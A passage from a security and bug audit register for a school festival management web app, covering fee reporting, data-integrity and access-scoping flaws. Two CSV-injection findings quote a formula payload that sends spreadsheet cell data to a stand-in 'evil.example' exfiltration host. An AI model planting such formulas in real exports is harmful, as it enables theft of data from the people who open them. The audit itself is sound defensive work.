**Expected → Actual.** `fest_school_event_fee_lines` should provide a durable, queryable breakdown of what produced a school's bill. It's only ever populated for 2 of 9 documented `fee_model` values (`sports_composite`, `kalolsavam_composite`); the remaining 7 — including `cksc_tiered`, the config-wide **default** for the `sahodaya` level — either delete-and-leave-empty or never touch the table.
**Reproduction & evidence.** Invoice-line persistence coverage across 9 fee_models: lines persisted for exactly 2 of 9.
**Impact.** There is no durable, queryable record of what produced most schools' bills — a dispute or audit for a `cksc_tiered`-billed school (the config-wide default) has nothing to itemize against.
**Fix.** Extend `syncFeeLines()` to cover all 9 fee models, not just 2.
**Tests.** `fest_school_event_fee_lines` populated for the other 7 fee models. **Scope:** medium. **Dependencies:** none.

---

#### `FEE-07[Precedence]` — The official approved-receipt view never freezes a breakdown; it re-resolves live on every view
**P1 · confirmed · Audit 2 §9e.** Tenant: any · Actors: Sahodaya Admin, School Admin (both view the same already-paid receipt) · Phase: post-approval receipt viewing.
**Expected → Actual.** An already-approved, already-paid fee receipt's line items should be stable once settled. `feeReceipt()` never freezes a breakdown — it re-resolves the schedule **live** on every view via `resolveSchedule()`+`breakdown()`. Two people viewing the same closed, paid receipt at different times, after any fee-settings or item-fee edit in between, can see genuinely different line items for a payment that is supposed to be settled.
**Impact.** A dispute over "what did I actually pay for" cannot be resolved from the receipt view alone if the underlying schedule has changed since — the receipt is not actually a receipt in the durable-record sense.
**Fix.** Add a frozen breakdown snapshot column (e.g. `approved_breakdown_json`) on `fest_school_event_fees`, captured at approval time, mirroring the pattern `FestInvoiceService` already uses for `breakdown_json` at issue time.
**Tests.** Approved-receipt breakdown stability across a post-approval fee-settings/item-fee edit — **CRITICAL**, currently zero coverage. **Scope:** medium (new column + capture-at-approval logic). **Dependencies:** shares the "snapshot instability" root cause with `FEE-01[Snapshot]`/`FEE-02[Snapshot]` — coordinate the fix design.

---

#### `FEE-01[Catalog]` — Appeal-fee payment has no audit trail at all
**P1 · design_gap · Audit 2 §7.** Tenant: any using the appeal-fee feature · Actors: Sahodaya Admin (marks appeal fee paid) · Phase: appeal-fee payment.
**Expected → Actual.** An appeal fee, like every other fee in the system, should route through the standard `FeeReceipt` → approval → ledger pipeline. Instead the fee is stamped and can be "marked paid" on trust alone — no `FeeReceipt`, no ledger post, unlike every other fee in the system.
**Impact.** No durable, auditable record that an appeal fee was actually collected — a gap in the one fee type explicitly tied to a dispute-resolution workflow, where an audit trail matters most.
**Fix.** Route appeal-fee payment through the standard `FeeReceipt` → approval → ledger pipeline.
**Tests.** End-to-end appeal-fee traceability (`FestAppealFeeTest`) — currently zero coverage. **Scope:** medium. **Dependencies:** none.

---

#### `RECON-01` — "Paid" in 3 report/export builders reads only the last-uploaded receipt, not the accumulated total
**P1 · confirmed bug · Audit 3 §2.** Tenant: any settling a fee across 2+ receipts · Actors: Sahodaya Admin (Fee Collection report + export); School Admin (own fee summary) · Phase: multi-installment fee reporting.
**Expected → Actual.** A school's "Paid" figure should equal `FestSchoolEventFee.amount_paid` — the model's own authoritative, accumulated total, already used correctly by `outstandingBalance()`/`isFullyPaid()`. Three independent methods instead compute "paid" as `(float) ($fee->feeReceipt?->amount ?? 0)` — a single `belongsTo` FK pointing only at the **most-recently-uploaded** receipt. `attachPayment()` repoints `fee_receipt_id` on every new upload; `approve()` never repoints it back, only calls `refreshPaidState()` (which correctly re-sums all approved receipts into `amount_paid`). A school paying via 2+ separately-approved receipts gets "Paid" silently reported as just the last receipt, while the same row's `status` correctly says approved/fully-paid — an internally contradictory report row. `SchoolPaymentHistoryService::mapFestRow()` reads the correct `amount_paid` for the identical fee at the identical moment, so two portals disagree with each other.
**Reproduction & evidence.** Fee `total_due=10000`. Receipt #1 approved for 3000 (`amount_paid`→3000, status `partial`). Receipt #2 approved for the remaining 7000 (`amount_paid`→10000, status `approved`). Fee Collection report/export shows "Paid: 7000" while "Status: approved." `FestEventReportAnalyticsService.php:154`; `FestExportService.php:172`; `FestSchoolReportAnalyticsService.php:36`. Contrast: `SchoolPaymentHistoryService.php:191` reads `amount_paid` correctly. `FestSchoolEventFeeService::attachPayment()` (1403-1425); `TracksPartialPayments.php:53-72` (`refreshPaidState()`).
**Impact.** Finance staff and schools are shown a materially wrong "amount paid" for any fee settled in installments, while the same row claims fully-paid status.
**Fix.** Replace `$fee->feeReceipt?->amount ?? 0` with `(float) $fee->amount_paid` at all three call sites; keep the `feeReceipt` relation only for "most recent receipt number/date" display.
**Tests.** Zero tests reference these classes/methods (`RECON-06`). **Scope:** small (three call sites, same fix). **Dependencies:** land together with `RECON-02` — see §18.

---

#### `RECON-02` — 4 report builders double-count the fee rollup row
**P1 · report mismatch · Audit 3 §2.** Tenant: any on per-head or per-phase-non-regional billing · Actors: Sahodaya Admin (exports, Finance Hub, Registration & Fees Register, State ERP report) · Phase: fee-total summation.
**Expected → Actual.** Every report summing `total_due`/`outstandingBalance()` per school should exclude the `head_id=null`/`phase_id=null` rollup row via `scopeForAmountAggregation()`, already applied correctly in 26 other call sites (independently re-counted this pass, exceeding the source's "20+"). Four builders query the same table **without** `->forAmountAggregation()`, summing both the rollup row and every head/phase-specific row for the same school. Two of the four buggy/correct pairs sit inside the **same class**: `FinanceHubController::receivables()` (no scope) vs. `FinanceHubController::index()` (has the scope, same file).
**Evidence.** `FestExportService.php:149-156,213-220` (an ad hoc filter that doesn't cover per-head or per-phase-non-regional billing); `FestRegistrationRegisterService.php:55-69`; `FestCrossEventReportService.php:408-420` (vs. the same file's correctly-scoped `:231-243`/`:1175-1188`); model docblock `FestSchoolEventFee.php:34-42` names this exact risk as `forAmountAggregation()`'s purpose.
**Impact.** An admin trusting the exported spreadsheet, Receivables drill-down, Registration & Fees Register, or state-level export over the on-screen preview materially overstates how much a school (or the Sahodaya as a whole) is owed, for any phase-split or legacy per-head event.
**Fix.** Add `->forAmountAggregation()` to the four flagged builders.
**Tests.** None (`RECON-06`). **Scope:** small (four call sites, one-line fix each). **Dependencies:** land together with `RECON-01`.

---

#### `RECON-04` — A second legacy fees-export route has zero region scoping
**P1 · security issue · Audit 3 §2. Cross-references `SEC-01[Lifecycle]` (P0, §9.1) — same underlying vulnerability, kept as a separate entry per §1.3.** Tenant: any partitioned · Actors: Region-scoped Sahodaya admin · Phase: fee/payment export.
**Expected → Actual.** Every route serving the Fest fee/payment export should apply the same `FestReportScope` restriction the canonical export path applies. A second, legacy route (`export.fees`, `GET .../events/{event}/export/fees` → `FestExportController::fees()`) duplicates the catalog-driven route but calls `FestExportService::fees($event)` with **no** `$schoolId` and **no** `FestReportScope` at all — this is one of the same 4 routes `SEC-01[Lifecycle]` describes, independently rediscovered from the financial-reconciliation angle with its own distinct evidence.
**Reproduction & evidence.** A region_admin assigned to Region A only, hitting this legacy route over real HTTP through the real middleware stack for a two-region hub, received School B's (Region B) name and its distinctive fee total in the response, while the canonical scoped path correctly excluded Region B for the identical actor. `routes/web.php:1263` (`export.fees`) vs. `:1396` (canonical); `FestExportController.php:32-37`. **Correction to the original recommendation:** the sibling `export.attendance` route is **not** orphaned — `Attendance.vue:342` links to it directly; only `export.fees` (and, pending individual verification, `export.registrations`/`export.results`) should be removed or fixed.
**Impact.** Any currently-assigned region_admin can retrieve every school's fee/payment data across all regions of an event today, via a URL with the same shape as a sibling route already live-linked in the UI.
**Fix.** Remove `export.fees`/`FestExportController::fees()`, or rewrite it to build and honor a `FestReportScope` the way `FestReportController::export()` does — as part of the same change that fixes `SEC-01[Lifecycle]`. Do not remove `export.attendance` in the same pass.
**Tests.** Promote the scratch test into the permanent suite. **Scope:** small (subsumed by `SEC-01[Lifecycle]`'s fix). **Dependencies:** same fix as `SEC-01[Lifecycle]` — do not treat as two separate work items.

---

#### `SEC-01[SecAudit]` — CSV/Excel formula injection across the whole export layer
**P1 · security issue · Audit 3 §3. Same vulnerability class as `EXP-02` (§9.3) and `SEC-01[TestExec]` (§9.2 below) — three views of one bug, cross-referenced not duplicated.** Tenant: any · Actors: School-level data entry (planter, lower-trust) → Sahodaya/state admin opening the export (consumer, higher-trust) · Phase: any spreadsheet/CSV export.
**Expected → Actual.** Any exported cell value beginning with `=`, `+`, `-`, or `@` must be neutralized before writing (CWE-1236). None of the Fest module's writers do this: (1) `App\Support\ExcelExport::spreadsheetXml()` only applies `htmlspecialchars()` — backs ~20+ export call sites; (2) raw `fputcsv()` with zero formula-escaping in `FestEventFeesController::exportPayments`, `FestRegistrationRegisterService::exportCsv`, `CsvExportDispatcher::streamDownload`; (3) hand-built CSV string concatenation with no escaping in `FestReportService::clashesCsv`/`itemScheduleCsv`/`promotionsCsv`. Entry points `Student.name` and `FeeReceipt.transaction_ref` both carry zero character restriction — either is directly plantable by a school-level actor.
**Reproduction & evidence.** A git-tracked scratch test (`ScratchFormulaInjectionAuditTest`, committed in `ee246f53`) re-run: raw CSV output captured `"=HYPERLINK(""https://evil.example/exfil?x=""&A1,""Click for receipt"")"` — the leading `=` inside the RFC4180-quoted cell is completely unneutralized; once a spreadsheet app dequotes the cell on open, it still begins with `=` and is parsed as a live formula. `ExcelExport.php:34-64`; `FestEventFeesController.php:357`; `FestRegistrationRegisterService.php:189-228`; `CsvExportDispatcher.php:67-81`; `FestReportService.php:1171-1258`.
**Impact.** A classic privilege-crossing CSV-injection attack: realistic payloads can exfiltrate data (`HYPERLINK`/`WEBSERVICE`-style formulas), phish via a disguised clickable cell, or, on legacy Excel/DDE configurations, achieve local command execution. The pattern repeats across dozens of export methods spanning registrations, results, attendance, fees, certificates, catering, and audit-log exports.
**Fix.** Add one shared `neutralizeFormulaCell($value)` helper (OWASP guidance: prefix a leading `=`/`+`/`-`/`@`/tab/CR with an apostrophe) and apply it inside `ExcelExport::spreadsheetXml()`'s escape closure and every `fputcsv()`/manual-CSV call site.
**Tests.** The existing scratch test's own assertion style needs fixing too (compares raw bytes, not the decoded cell value — see `SEC-01[TestExec]` below). **Scope:** medium (one shared helper, ~20+ call sites to wire it into). **Dependencies:** fix once, apply everywhere — do not patch call sites individually.

---

#### `SEC-02[Lifecycle]` — Athletic records and live pages leak names/marks pre-publication
**P1 · security issue · Audit 3 §4.** Tenant: any with `record_tracking_enabled` · Actors: public/anonymous site visitor · Phase: pre-publication (any time a judge enters a qualifying mark).
**Expected → Actual.** No participant name or measurement tied to an in-progress/unpublished event should reach an unauthenticated visitor, matching every sibling public method's pattern (`results`, `itemResults`, `winnerPoster`, `itemResultsPdf`, `schedule` all correctly gate first). `publicAthleticRecords()`/`recentRecordBreaks()` check **only** `record_tracking_enabled` — no `results_published` check anywhere. `records()` (the controller action) has zero lifecycle check at all. `FestMarkSaveService::save()` calls `FestAthleticRecordService::evaluateMark()` unconditionally on every mark save, writing `FestAthleticRecord`/`FestRecordBreak` rows immediately with zero `results_published` references anywhere in that 185-line service. `live()`/`liveData()`'s `livePayload()` also queries raw `FestSchedule` rows with no `schedule_published` check.
**Evidence.** `FestPortalController.php:676-718` (only checks `record_tracking_enabled`), `:556-566` (`records()`, no lifecycle check), `:497-540` (`livePayload()`); `FestAthleticRecordService.php` (full file, zero `results_published` references).
**Impact.** Breaks the chest-number-anonymity-until-reveal pattern the rest of the public portal is built around, with no admin action required beyond a judge entering a qualifying mark — `record_tracking_enabled` defaults false but is a real, admin-settable toggle.
**Fix.** Gate `publicAthleticRecords()`/`recentRecordBreaks()` on the same `rootResultsAvailable($event)` check `itemResults()`/`itemResultsPdf()` already use; gate `livePayload()`'s `$nowSlot` on `schedule_published`.
**Tests.** None exist. **Scope:** small. **Dependencies:** same theme as `PUB-01`.

---

#### `EXP-01` — Malayalam names render as empty boxes in every Fest PDF report
**P1 · confirmed bug · Audit 3 §5.** Tenant: any (this is a Kerala inter-school festival system; Malayalam names are the routine case) · Actors: Sahodaya Admin/School Admin (any PDF report consumer) · Phase: any PDF export.
**Expected → Actual.** Malayalam-script student/teacher/school names should render legibly in exported PDFs. All 30/30 Fest report PDF Blade views use Latin-only font stacks (28 `'DejaVu Sans'`, 2 `Helvetica`/`Arial`). A from-scratch TTF cmap parser against `vendor/dompdf/dompdf/lib/fonts/DejaVuSans.ttf` found **0/128** Malayalam codepoints (U+0D00–U+0D7F) present — cross-validated against a known-good control (Cyrillic: 256/256 present). A fresh end-to-end reproduction (Dompdf render → PNG) visually confirmed Latin text rendered while Malayalam rendered as tofu boxes — and confirmed `pdftotext` **does** recover the correct Unicode via the embedded ToUnicode CMap even though nothing visually rendered, proving a `pdftotext`-only regression test would give a false pass.
**Evidence.** `vendor/dompdf/dompdf/lib/fonts/DejaVuSans.ttf` (own cmap parse); `resources/views/fest/reports/*.blade.php` (28/30 + 2/30, all Latin-only); `app/Support/PdfGenerator.php:41-86` (dompdf fallback path, triggers whenever `PDF_CONVERTER_URL` is empty, with **zero** `Log::` calls anywhere — the fallback is genuinely silent).
**Impact.** Any environment relying on the built-in dompdf fallback — the documented local-dev path, and the silent behavior in production if the external Chromium converter is ever unset, misconfigured, or transiently unreachable — produces attendance sheets, admit cards, mark-entry sheets, and registration lists with unreadable names, i.e. documents meant for identity verification at a live event. Whether the external Chromium service has Malayalam fonts installed is unconfirmed from this repo (§20/unverified areas).
**Fix.** Register a Malayalam-capable Unicode font (Noto Sans Malayalam or Meera) with dompdf and reference it in the report stylesheets' font-family fallback chain; verify dompdf's actual glyph-fallback behavior directly. Make the `PDF_CONVERTER_URL` fallback loud (log a warning, or fail closed) instead of silently degrading.
**Tests.** Zero Malayalam-script text anywhere in the test suite (`EXP-03`). **Scope:** medium (font packaging + stylesheet changes across 30 views, plus the silent-fallback logging fix). **Dependencies:** none.

---

#### `TECH-01[TechAudit]` — Duplicate chest numbers and duplicate item registrations are both possible at the schema level
**P1 · data-integrity issue · Audit 3 §6.** Tenant: any · Actors: Sahodaya Admin/School Admin (registration + chest-number assignment) · Phase: fest-day chest numbering, roster building.
**Expected → Actual.** The schema should guarantee, independent of application code, that no two team/group registrations share a chest number and a student cannot be registered twice for the same item. `fest_groups` has **zero indexes of any kind** — its unique constraint was added by one migration, dropped by a later one, force-dropped again by a third whose `down()` is a literal no-op, and never replaced. `fest_participants` only enforces `(registration_id, student_id)` uniqueness, not `(item_id, student_id)`. The only real protection is `FestEvent::lockForUpdate()` inside the registration transaction and `FestNumberingService`'s chest-assignment methods — a single-code-path safeguard with no schema backstop.
**Reproduction & evidence.** A scratch test against the fully-migrated schema: `PRAGMA index_list('fest_groups')` returned 0 rows; inserting a second `FestGroup` with the same `(event_id=1, chest_no=555)` **succeeded**, leaving 2 rows sharing that pair; creating two `FestParticipant` rows for the same student against two different registrations for the identical item also **succeeded**. `2026_08_26_000001_fest_group_chest_numbers.php:44-48` (adds); `2026_09_01_000001_fest_chest_scope_per_event_type.php:53-64` (drops, nothing re-added); `2026_09_01_000002_fix_fest_groups_chest_constraint.php:10-19,32-34` (force-drops again, no-op `down()`).
**Impact.** Two competitors could physically share a chest number at a live event — marks entry, judge panels, gate scanning are all keyed by chest number — misattributing marks/attendance between two real students; a student duplicated across two registrations for one item would be double-counted in participation-fee billing and could receive duplicate results/certificates.
**Fix.** Add a real unique index on `fest_groups(event_id, chest_no)`; add a unique (or partial/filtered unique) index enforcing at most one active `fest_participants` row per item+student.
**Tests.** None exist. **Scope:** small (two index migrations, but must audit existing data for pre-existing violations before adding a hard constraint in production). **Dependencies:** coordinate with `TECH-09[TechAudit]`'s missing-FK fix — both touch the same tables.

---

#### `TECH-03[TechAudit]` — Waitlist promotion has no capacity lock, proven live
**P1 · confirmed bug · Audit 3 §6.** Tenant: any using waitlisting with `QUEUE_CONNECTION=sync` (today's default) or any async queue driver · Actors: School Admin (page load triggers the job); background job worker · Phase: waitlist promotion.
**Expected → Actual.** Promoting a waitlisted registration into an approved slot should be serialized against capacity the same way initial registration already is (`createForSchool()` explicitly takes `FestEvent::lockForUpdate()`). `FestRegistrationApprovalService::promoteAllEligibleWaitlisted()` reads every waitlisted registration, then for each calls `isHeadAtCapacity()` (a plain, **unlocked** `COUNT` query) and promotes if under capacity — with no `DB::transaction()`/`lockForUpdate()` anywhere in the method. Dispatched via `PromoteWaitlistedRegistrationsJob`, which runs **inline on every GET** to the school registration page today (`QUEUE_CONNECTION=sync`); concurrency becomes the norm the instant an async queue driver is adopted.
**Reproduction & evidence.** Scratch test manually interleaved two "concurrent" capacity checks before either write committed: head with `max_participants=2`, 1 approved (1/2 used), 2 waitlisted racing for the 1 remaining slot. Both `isHeadAtCapacity()` reads returned `false` before either write; both writes proceeded to `submitted`. Final count against capacity 2: **3** — the ceiling was breached by one. `FestRegistrationApprovalService.php:110-147`; `FestParticipationLimitService.php:244-294`; `PromoteWaitlistedRegistrationsJob.php:10-27,41-50`.
**Impact.** A capacity-constrained head/item can end up with more approved participants than its capacity allows, defeating the one hard ceiling the feature exists to enforce, under realistic concurrent page-load traffic.
**Fix.** Wrap `promoteAllEligibleWaitlisted()`'s per-registration check-then-promote in the same `DB::transaction()`+`lockForUpdate()` pattern `createForSchool()` already uses.
**Tests.** None exist. **Scope:** small. **Dependencies:** none.

---

#### `SEC-01[TestExec]` — Live HTTP proof of the CSV-injection class via the fees-export route
**P1 · security issue · Audit 3 §7. Same bug class as `SEC-01[SecAudit]`/`EXP-02` — presented separately because it is this pass's direct live-HTTP confirmation, not merely a repeated code citation.** Tenant: any · Actors: School-level data entry (planter) → Sahodaya admin (consumer) · Phase: fees export via real HTTP.
**Expected → Actual.** Same expectation as `SEC-01[SecAudit]`. Confirmed via `ScratchFormulaInjectionAuditTest::test_transaction_ref_formula_payload_is_not_escaped_in_csv_export`, independently re-run fresh in this pass's own full-suite execution (§20): raw CSV `"=HYPERLINK(""https://evil.example/exfil?x=""&A1,""Click for receipt"")"` present, unneutralized. The test's *own* assertion is miscalibrated (it compares raw bytes against RFC4180 quote-doubling, so it shows red for the wrong stated reason) — but the underlying vulnerability the raw bytes prove is real regardless of the test's own bug.
**Impact.** Same as `SEC-01[SecAudit]` — this is that finding's own executable proof.
**Fix.** Same shared `neutralizeFormulaCell()` helper. Separately, fix the test's assertion to compare the *decoded* cell value so it correctly asserts pass/fail on neutralization itself, not on RFC4180 quoting mechanics.
**Tests.** This test currently sits in the tree as `TECH-01[TestExec]`... see `TG-07`/§16 — it is a leftover scratch file mixed into every suite run's counted totals, not yet promoted to a proper regression test with a correct assertion. **Scope:** trivial (test fix) once the underlying vulnerability is patched. **Dependencies:** the underlying fix is `SEC-01[SecAudit]`'s — do not fix this test's assertion before the real vulnerability is patched, or it will start passing for the wrong reason.

---

#### `BUG-03` — Board-result publish silently swallows a SQL error in the awards pipeline
**P1 · data-integrity issue · Audit 3 §7. Note: Board Results is outside this series' stated Kalolsavam scope, but is included here because it was found as a direct byproduct of this audit's own full-suite test execution and shares the same publish-pipeline error-handling pattern several Fest findings above rely on.** Tenant: any · Actors: Sahodaya admin (board-result publish) · Phase: post-publish awards computation.
**Expected → Actual.** Publishing a board result should successfully run its full post-publish pipeline (ranking, awards, API sync, topper certificates). `AwardsEngine::awardMostSubjectToppers()` issues `->selectRaw('tenant_id, COUNT(DISTINCT subject_id) as c')` against `Topper::query()` — but `toppers` has **no `subject_id` column** (it has `subject_marks` jsonb; the relational per-subject data lives on `topper_subject_marks`, correctly `whereHas`-joined but then still referenced by the bare unqualified column name). This throws `SQLSTATE[HY000]: General error: 1 no such column: subject_id` on **every single invocation** — deterministic, not data-dependent. `BoardResultVerificationController` deliberately wraps this pipeline in a try/catch specifically so "pipeline failure should not undo the publish" — the status transition succeeds and the admin sees no error at all, while ranking/awards/certificate generation silently fails every time.
**Reproduction & evidence.** Independently reproduced fresh, twice, byte-for-byte identical SQL and message, via this pass's own full-suite re-run (§20). `AwardsEngine.php:168-214` (both `selectRaw` calls, :187 and :205); `BoardResultVerificationController.php:378-402` (catch/log site); `2026_05_24_000005_create_results_tables.php:26-42` (confirms no `subject_id` column). Matches the pattern of very recent `fix(subject-toppers)`/`fix(board-results)` commits already in this repo's history — suggesting it has been silently broken since whatever recent refactor moved subject-level marks off the `toppers` table.
**Impact.** Every board-result "publish" action silently fails to compute the "Most Subject Toppers" award and, since the exception aborts the rest of the pipeline, potentially the ranking/certificate steps after it — with zero user-facing indication.
**Fix.** Fix the two `selectRaw` queries to count distinct subjects via the `topper_subject_marks` relation; add a regression test that actually asserts `AcademicAward` rows get created.
**Tests.** No test currently catches this — the catch-and-log means it doesn't fail any assertion. **Scope:** small. **Dependencies:** none (out-of-module, flag to the Board Results owner regardless of this series' remit).

---

### 9.3 P2 — 76 findings (condensed format: all 17 fields present, single-paragraph density)

**Event setup (Audit 1 §6.1):**

**`EVT-02[Event setup]`** — Deleting an event permanently orphans `FestItemHead`/`FestCompetitionArea` rows. P2 · confirmed. Tenant: any. Actors: Sahodaya Admin. Expected: deleting a zero-registration event should leave no orphaned event-scoped data. Actual: only these 2 tables (of 12 `event_id`-scoped tables) have **zero FK protection anywhere in the schema** — no `foreign()` call at all, confirmed via `PRAGMA foreign_key_list` and migration source (`2026_08_15_000001_fest_competition_areas.php`; the `fest_item_heads` block of `2026_07_05_000001_sports_fest_platform.php`) — reproduced as a permanent orphan on production Postgres, not just the SQLite test sandbox. Impact: unbounded storage/data-integrity leak with no cleanup path, accumulating every time an event with such rows is deleted. Fix: add a foreign key on both `event_id` columns (cascade or null-on-delete), or explicit cleanup in `destroy()`. Tests: none exist. Scope: small. Dependencies: none.

**`EVT-03[Event setup]`** — No validation that registration/event dates are chronological. P2 · confirmed. Tenant: any. Actors: Sahodaya Admin. Expected: `registration_close`/`event_end` should not precede their `_open`/`_start` counterparts, matching the `after_or_equal` rule every sibling endpoint (`FestEventPhaseController`, `FestEventSettingsController`) already applies. Actual: `FestEventController::store()`/`update()` validate all four fields as plain `nullable|date` with no cross-field ordering rule (lines 151-178, 552-577). Reproduced: backwards dates persist verbatim, 302 success, no session error. Impact: silently corrupts `FestEvent::isRegistrationOpen()`/`FestLifecycleService::suggestedStatus()` — registration ends up permanently "not open" with no signal pointing at the data-entry mistake. Fix: add `after_or_equal:registration_open`/`after_or_equal:event_start`. Tests: none exist for this controller specifically. Scope: small. Dependencies: none.

**`EVT-06[Event setup]`** — Reopening a cancelled event never restores its force-withdrawn registrations. P2 · design_gap. Tenant: any. Actors: Sahodaya Admin. Expected: `StatusTransitionGuard` explicitly allows `cancelled → draft` ("Admin re-opening"); reopening should give some path back to pre-cancellation registrations, or the UI should make clear it doesn't. Actual: `transitionToCancelled()` force-sets every active registration to `'withdrawn'`; no code anywhere transitions a registration back out of `'withdrawn'` (grepped for restore/reinstate/reactivate/unwithdraw — zero hits). Currently unreachable end-to-end because `EVT-01[Event setup]` blocks ever reaching `cancelled`; once that P0 is fixed this becomes a live dead end. Impact: every school that registered before cancellation stays withdrawn after reopening, with no UI or service path to restore them. Fix: either relabel the transition to make clear it doesn't restore registrations, or add an explicit bulk-restore action scoped to registrations withdrawn *by that cancellation*. Tests: none exist. Scope: small. Dependencies: only becomes reachable once `EVT-01[Event setup]` is fixed — sequence accordingly (§19).

**Competition setup (Audit 1 §6.2):**

**`CS-04`** — Bulk taxonomy "reset to defaults" hard-deletes custom, in-use entries. P2 · confirmed. Actors: Sahodaya Admin. Expected: consistent with `FestTaxonomyMasterController::destroy()` (checks `entryInUse()`, soft-deactivates) and the sibling `FestCompetitionTypeController::resetDefaults()` (scopes to `is_system=true` only). Actual: `resetDefaults()` runs an unconditional delete with no in-use check; `FestTaxonomyMaster` has no `is_system`/`is_custom` column, so system-seeded and admin-added entries are indistinguishable and both get wiped. Impact: one confirmed click removes tenant-authored taxonomy configuration actively referenced by live items, across any of 10 taxonomy dimensions, with no per-entry protection. Fix: restrict the bulk delete to entries not currently in use, or add an `is_system` flag matching the sibling controller. Tests: none exist. Scope: small. Dependencies: none.

**`CS-05`** — Mandatory-item enforcement only runs on manual review, never on auto-approval or bulk-approve. P2 · design_gap. Actors: School Admin (registration); Sahodaya Admin (expects enforcement via bulk-approve too). Expected: `FestMandatoryItemService` should stop approvals while a mandatory item is unregistered, regardless of approval policy. Actual: the only hard-blocking call site is `FestRegistrationReviewController::approve()`; `createForSchool()`'s `$initialStatus` resolution (taken by auto-approved registrations) never consults it, nor does `FestRegistrationBulkService::approveMany()`. Impact: auto-approval events (a normal, supported configuration) and bulk-approve provide no real guarantee mandatory items get registered before other items are approved. Fix: call `validateBeforeApproval()` inside `createForSchool()`'s status resolution and inside `approveMany()`. Tests: none cover the actual gap. Scope: small. Dependencies: none.

**School registration (Audit 1 §6.3):**

**`SCHREG-04`** — Bulk-reject doesn't require a rejection reason. P2 · confirmed. Actors: Sahodaya Admin. Expected: `reject()` enforces `'rejection_reason' => 'required|string|max:500'`; `docs/FLOW_GAP_FIX_PLAN.md` §2.2 specifies `bulkReject()` should too. Actual: `bulkReject()` validates it as `nullable` — a batch reject can be submitted with no reason, persisting `rejection_reason=null`. Impact: a school whose registrations are bulk-rejected can be left with zero explanation in the record, notification, and audit trail for the whole batch. Fix: change `bulkReject()`'s rule to `required|string|max:500`, matching `reject()`. Tests: none exist. Scope: trivial. Dependencies: none.

**Marks and results (Audit 1 §6.5):**

**`Marks EVT-03`** — Marks can still be edited after an item's own results are individually published. P2 · confirmed. Actors: Sahodaya Admin Mark Entry/Results. Expected: once `results_published_at` is set for an item, further mark changes should either be blocked or bump the timestamp. Actual: `allowMarkEntryForItem()` never inspects the item's own `results_published_at`; `FestMarkSaveService::save()` never touches it either — it silently goes stale. A real asymmetry versus the hub-level flow, which correctly blocks further entry once published there. Impact: the per-item "Results Published" timestamp staff rely on as a completeness/finality signal is not trustworthy. Fix: reject mark entry when the item's own `results_published_at` is set, or bump/clear it on save. Tests: none cover editing a mark after `publishItem()`. Scope: small. Dependencies: none.

**`Marks EVT-05`** — The public Individual Championship board never auto-recalculates. P2 · confirmed (upgraded from `design_gap` after live reproduction). Actors: consumed by the public results page's Championship tab. Expected: should stay in sync with the school-level scoreboard, since both derive from the same `FestMark` data on the same page. Actual: `FestIndividualChampionshipPoint` rows are populated only by the manual `recalculate()` POST action; nothing in the mark-save or publish workflow calls it, unlike the school scoreboard, which recalculates automatically inside `FestMarkSaveService::save()`. Reproduced live: one mark saved → `FestResult` auto-populates, `FestIndividualChampionshipPoint` stays at 0 until the manual action is run. Impact: public trophy/individual-championship standings can visibly disagree with, or sit blank next to, the correct live school scoreboard until an admin remembers a manual step with no reminder anywhere. Fix: call championship recalculation from the same places school-point recalculation is already called. Tests: existing `FestPublicScoreboardTest` only incidentally references the school-level label, not this tab. Scope: small. Dependencies: none.

**Qualification and promotion (Audit 1 §6.6):**

**`QUAL-02`** — Re-promoting winners to a corrected target event silently no-ops. P2 · confirmed. Actors: Sahodaya Admin. Expected: an admin who promotes to the wrong event by mistake and re-runs promotion targeting the correct one should either succeed or get a clear conflict error. Actual: `FestQualification::firstOrCreate()` is keyed only on `['event_id','item_id','participant_id']` — `next_level_event_id` is only in the create-defaults, never the lookup key; when a qualification already exists, the code does `$skipped++; continue`, and the message is just "{promoted} promoted. {skipped} skipped," with no naming of the conflicting event. A separate `revokePromotion()` action exists but isn't obviously connected to the skipped-promotion message. Reproduced: promote to "WRONG" (1 promoted), re-promote to "CORRECT" → `{"promoted":0,"skipped":1}`, student registered only in the wrong finale. Impact: recovery requires finding and using the separate revoke action first, with no signal that's necessary. Fix: include `next_level_event_id` in the lookup key, or surface the existing qualification's current target by name; expose a bulk re-target action. Tests: none exist. Scope: small. Dependencies: none.

**`QUAL-03`** — Resubmitting qualifiers after an unrelated correction duplicates every unchanged entry at State. P2 · confirmed. Actors: Sahodaya Admin (submission), State Admin (approval). Expected: resubmitting qualifiers after an unrelated correction shouldn't duplicate `StateFestRegistration` rows for unchanged participants. Actual: the idempotency hash is computed over the *whole* entries array — any single entry changing invalidates the identity of every other unchanged entry, and materialization dedups only on a fresh per-intake `qualifier_entry_id` with no durable cross-intake identity column. Reproduced: submit intake #1 (approved, N registrations), correct one unrelated mark, submit intake #2 (all N+ entries again), approve → `StateFestRegistration` now has duplicate rows for N-1 unchanged participants. Impact: any correction workflow duplicates every other already-approved, unchanged qualifier in the batch, requiring manual State-side detection and cleanup. Fix: add a durable, real column for the source qualifier's stable identity and use it — not `qualifier_entry_id` — as the materialization dedup key. Tests: none exist for this near-identical-resubmission case specifically. Scope: medium. Dependencies: none.

**`QUAL-04`** — The reserve-replacement workflow both error messages promise does not exist. P2 · design_gap. Actors: Sahodaya Admin. Expected: the data model explicitly supports "reserve" nominations, and both `select()`/`unselect()` error messages promise a replacement workflow for swapping a reserve into a primary slot post-certification. Actual: only 4 state-nomination routes exist (index/select/unselect/certify); a repo-wide grep found zero implementation of any nomination-replace or reserve-promotion logic anywhere — only the two error-message string literals reference it. No decertify/uncertify mechanism exists either, so a certified batch has no in-app path back to editable state at all. Impact: if a certified primary becomes unavailable after certification, there is no application-level way to swap in the reserve — a structural dead end requiring an out-of-band database fix. Fix: implement the referenced replacement workflow — a certified-batch-safe action that withdraws a certified primary and promotes the next-priority reserve. Tests: none exist. Scope: large (new controller logic, new UI). Dependencies: product should confirm this is still wanted before building — §17.

**Certificates (Audit 1 §6.7):**

**`CERT-06`** — Volunteer/staff "duty" certificate issuance is fully implemented but wired to zero call sites. P2 · confirmed. Actors: Sahodaya Admin. Expected: "duty" certificates for volunteers/organizers — a cert_type the system already fully models — should be generatable, matching record-break certificates. Actual: `issueVolunteerCertificate()`/`issueStaffCertificate()` are both fully implemented (template resolution, correct achievement text) but have zero call sites anywhere — no controller, route, console command, or job. Impact: none (missing feature, not a bug) — a fully-built capability sits unreachable. Fix: wire a "generate certificate" action to the existing volunteer/staff roster admin UI. Tests: N/A until wired. Scope: small. Dependencies: none.

